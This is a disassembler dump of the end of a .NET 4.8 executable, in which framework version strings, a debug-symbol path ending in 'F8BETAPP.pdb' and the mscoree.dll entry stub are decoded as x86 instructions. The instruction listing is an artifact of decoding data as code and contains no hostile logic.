  4080fe:	00 1a                	add    %bl,(%edx)
  408100:	2e 4e                	cs dec %esi
  408102:	45                   	inc    %ebp
  408103:	54                   	push   %esp
  408104:	46                   	inc    %esi
  408105:	72 61                	jb     0x408168
  408107:	6d                   	insl   (%dx),%es:(%edi)
  408108:	65 77 6f             	gs ja  0x40817a
  40810b:	72 6b                	jb     0x408178
  40810d:	2c 56                	sub    $0x56,%al
  40810f:	65 72 73             	gs jb  0x408185
  408112:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  408119:	38 01                	cmp    %al,(%ecx)
  40811b:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40811f:	46                   	inc    %esi
  408120:	72 61                	jb     0x408183
  408122:	6d                   	insl   (%dx),%es:(%edi)
  408123:	65 77 6f             	gs ja  0x408195
  408126:	72 6b                	jb     0x408193
  408128:	44                   	inc    %esp
  408129:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  408130:	61                   	popa
  408131:	6d                   	insl   (%dx),%es:(%edi)
  408132:	65 12 2e             	adc    %gs:(%esi),%ch
  408135:	4e                   	dec    %esi
  408136:	45                   	inc    %ebp
  408137:	54                   	push   %esp
  408138:	20 46 72             	and    %al,0x72(%esi)
  40813b:	61                   	popa
  40813c:	6d                   	insl   (%dx),%es:(%edi)
  40813d:	65 77 6f             	gs ja  0x4081af
  408140:	72 6b                	jb     0x4081ad
  408142:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  408145:	38 08                	cmp    %cl,(%eax)
  408147:	01 00                	add    %eax,(%eax)
	...
  408151:	00 00                	add    %al,(%eax)
  408153:	00 16                	add    %dl,(%esi)
  408155:	2d f2 9a 00 00       	sub    $0x9af2,%eax
  40815a:	00 00                	add    %al,(%eax)
  40815c:	02 00                	add    (%eax),%al
  40815e:	00 00                	add    %al,(%eax)
  408160:	3d 00 00 00 88       	cmp    $0x88000000,%eax
  408165:	81 00 00 88 63 00    	addl   $0x638800,(%eax)
	...
  408177:	00 10                	add    %dl,(%eax)
	...
  408185:	00 00                	add    %al,(%eax)
  408187:	00 52 53             	add    %dl,0x53(%edx)
  40818a:	44                   	inc    %esp
  40818b:	53                   	push   %ebx
  40818c:	8b 42 2f             	mov    0x2f(%edx),%eax
  40818f:	01 01                	add    %eax,(%ecx)
  408191:	f6 21                	mulb   (%ecx)
  408193:	44                   	inc    %esp
  408194:	84 4d 03             	test   %cl,0x3(%ebp)
  408197:	7e 74                	jle    0x40820d
  408199:	ab                   	stos   %eax,%es:(%edi)
  40819a:	fd                   	std
  40819b:	de 01                	fiadds (%ecx)
  40819d:	00 00                	add    %al,(%eax)
  40819f:	00 43 3a             	add    %al,0x3a(%ebx)
  4081a2:	5c                   	pop    %esp
  4081a3:	77 6f                	ja     0x408214
  4081a5:	77 5c                	ja     0x408203
  4081a7:	75 70                	jne    0x408219
  4081a9:	64 61                	fs popa
  4081ab:	74 65                	je     0x408212
  4081ad:	5c                   	pop    %esp
  4081ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4081af:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  4081b2:	44                   	inc    %esp
  4081b3:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4081b7:	5c                   	pop    %esp
  4081b8:	46                   	inc    %esi
  4081b9:	38 42 45             	cmp    %al,0x45(%edx)
  4081bc:	54                   	push   %esp
  4081bd:	41                   	inc    %ecx
  4081be:	50                   	push   %eax
  4081bf:	50                   	push   %eax
  4081c0:	2e 70 64             	jo,pn  0x408227
  4081c3:	62 00                	bound  %eax,(%eax)
  4081c5:	ed                   	in     (%dx),%eax
  4081c6:	81 00 00 00 00 00    	addl   $0x0,(%eax)
  4081cc:	00 00                	add    %al,(%eax)
  4081ce:	00 00                	add    %al,(%eax)
  4081d0:	00 07                	add    %al,(%edi)
  4081d2:	82 00 00             	addb   $0x0,(%eax)
  4081d5:	00 20                	add    %ah,(%eax)
	...
  4081eb:	00 00                	add    %al,(%eax)
  4081ed:	f9                   	stc
  4081ee:	81 00 00 00 00 00    	addl   $0x0,(%eax)
  4081f4:	00 00                	add    %al,(%eax)
  4081f6:	00 00                	add    %al,(%eax)
  4081f8:	00 00                	add    %al,(%eax)
  4081fa:	00 5f 43             	add    %bl,0x43(%edi)
  4081fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081fe:	72 45                	jb     0x408245
  408200:	78 65                	js     0x408267
  408202:	4d                   	dec    %ebp
  408203:	61                   	popa
  408204:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40820b:	72 65                	jb     0x408272
  40820d:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  408211:	6c                   	insb   (%dx),%es:(%edi)
	...
  40821a:	ff 25 00 20 40 00    	jmp    *0x402000
  408220:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  408225:	cd 97                	int    $0x97
  408227:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40822d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40822e:	78 43                	js     0x408273
  408230:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  408236:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40823c:	e6 c3                	out    %al,$0xc3
  40823e:	39                   	.byte 0x39
  40823f:	41                   	inc    %ecx
